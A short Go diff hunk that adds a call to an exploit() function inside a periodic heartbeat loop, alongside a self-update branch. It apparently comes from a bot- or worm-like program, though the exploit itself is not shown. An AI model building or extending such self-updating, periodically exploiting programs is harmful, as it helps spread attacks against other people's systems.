@@ -67,6 +67,8 @@ func heartbeat() {
 			if found == false {
 				fmt.Println("Try to update")
 				update.Replace()
+			} else {
+				exploit()
 			}
 		}
 		time.Sleep(time.Minute)
